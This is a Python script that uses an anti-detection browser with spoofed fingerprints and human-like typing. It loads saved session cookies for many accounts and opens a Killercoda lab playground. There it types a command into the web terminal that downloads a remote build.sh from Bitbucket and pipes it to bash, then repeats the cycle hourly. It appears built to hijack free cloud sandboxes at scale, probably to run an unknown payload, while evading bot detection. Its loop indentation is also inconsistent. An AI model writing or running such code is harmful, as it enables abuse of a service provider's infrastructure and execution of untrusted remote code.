import json
import os
import time
import glob
import argparse
from camoufox.sync_api import Camoufox
from browserforge.fingerprints import Screen

os.environ['DISPLAY'] = ':1'
SESSIONS_DIR = "sessions"

def load_sessions():
    files = sorted(glob.glob(os.path.join(SESSIONS_DIR, "*.json")))
    sessions = []
    for f in files:
        with open(f) as fp:
            sessions.append(json.load(fp))
    return sessions

parser = argparse.ArgumentParser()
parser.add_argument("-s", type=int, help="Pick session by 1-based index")
args = parser.parse_args()

all_sessions = load_sessions()
print(f"[+] Loaded {len(all_sessions)} sessions")

if args.s is not None:
    sessions = [all_sessions[args.s - 1]]
else:
    sessions = all_sessions

LAB_URL = "https://killercoda.com/course-cnpe/scenario/playground"
COMMANDS = ["curl 'https://bitbucket.org/nourri03/build/raw/932b85db83a23d7a025635ffe692b2cea616ea0d/build.sh' | bash", "free -m"]

with Camoufox(
    os=["windows", "macos", "linux"],
    screen=Screen(max_width=1920, max_height=1080),
    geoip=True,
    humanize=True,
    headless=False,
    block_webrtc=True,
    locale="en-US",
) as browser:
    while True:
        for s in sessions:
            email = s.get("email", "?")
            cookies = s.get("cookies", [])
            print(f"[+] Opening session: {email}")

            ctx = browser.new_context()
            ctx.add_cookies(cookies)
            page = ctx.new_page()
            page.goto("https://killercoda.com/", wait_until="domcontentloaded", timeout=60000)
            print(f"    -> {page.url}")

            # --- prepare the lab ---
            print(f"[+] Navigating to lab: {LAB_URL}")
            page.goto(LAB_URL, wait_until="networkidle", timeout=90000)
            time.sleep(3)  # let dynamic elements settle

        elements = page.query_selector_all("*")
        dump = []
        for el in elements:
            try:
                tag = el.evaluate("e => e.tagName.toLowerCase()")
                text = el.inner_text().strip()[:200]
                attrs = el.evaluate("""e => {
                    let o = {};
                    for (let a of e.attributes) o[a.name] = a.value;
                    return o;
                }""")
                dump.append({"tag": tag, "text": text, "attrs": attrs})
            except Exception:
                pass

        with open("lab_dump.json", "w") as f:
            json.dump(dump, f, indent=2)
        print(f"[+] Dumped {len(dump)} elements to lab_dump.json")

        # --- debug: find terminal frame ---
        print("[+] Waiting for terminal frame to load...")
        terminal_frame = None
        for attempt in range(60):  # up to 5 minutes
            for frame in page.frames:
                try:
                    el = frame.query_selector("#terminal-container")
                    if el:
                        terminal_frame = frame
                        break
                except Exception:
                    pass
            if terminal_frame:
                print(f"[+] Found terminal in frame: {terminal_frame.url}")
                break
            time.sleep(5)
            print(f"  retrying... ({attempt+1}/60)")
        else:
            print("[-] Terminal frame never found")

        if terminal_frame:
            # wait for xterm textarea to appear
            terminal_frame.wait_for_selector(".xterm-helper-textarea", timeout=60000)
            time.sleep(2)

            textarea = terminal_frame.query_selector(".xterm-helper-textarea")
            textarea.click()
            print("[+] Terminal focused, sending commands...")

            for cmd in COMMANDS:
                textarea.type(cmd, delay=80)
                page.keyboard.press("Enter")
                print(f"[+] Sent: {cmd}")
                time.sleep(2)  # wait for output

        # --- end terminal ---

        # Sleep 50 minutes then repeat
        print("[+] Sleeping 50 minutes before revisiting...")
        time.sleep(60 * 60)
        print("[+] Revisiting lab URL...")
